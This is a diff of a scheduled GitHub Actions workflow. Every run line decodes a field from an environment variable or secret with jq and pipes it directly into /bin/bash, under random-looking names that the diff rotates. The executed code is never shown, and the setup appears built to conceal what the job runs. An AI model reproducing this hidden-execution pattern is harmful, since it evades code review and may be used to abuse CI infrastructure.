@@ -2,24 +2,23 @@ name: yesignx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yesignx
         env:
-          qn79: ${{ secrets.qn79 }}
+          rumta725: ${{ secrets.rumta725 }}
         run: |
-          echo $qn79 | jq -r .sylfm2956 | /bin/bash
-          echo $rpb215 | jq -r .jixtu3 | /bin/bash
-          echo $whqc87 | jq -r .wsuz9 | /bin/bash
-          echo $jdsh15257 | jq -r .fnbk0756 | /bin/bash
-          echo $fkc43256 | jq -r .ov44 | /bin/bash
-          echo $hl21490 | jq -r .env86 | /bin/bash
-          echo $pbjvr3 | jq -r .lf3801 | /bin/bash
-          echo $yl93291 | jq -r .cf81 | /bin/bash
-          echo $zq1360 | jq -r .bwadg1338 | /bin/bash
-          echo $s4 | jq -r .nb9233 | /bin/bash
+          echo $rumta725 | jq -r .tzfw819 | /bin/bash
+          echo $nwfw23137 | jq -r .raug530 | /bin/bash
+          echo $sqb33954 | jq -r .g1 | /bin/bash
+          echo $bluwf8 | jq -r .letij8369 | /bin/bash
+          echo $louc68336 | jq -r .gg055 | /bin/bash
+          echo $kpd32 | jq -r .lz616 | /bin/bash
+          echo $mat4 | jq -r .pirc50 | /bin/bash
+          echo $o9205 | jq -r .lsgi7662 | /bin/bash
 
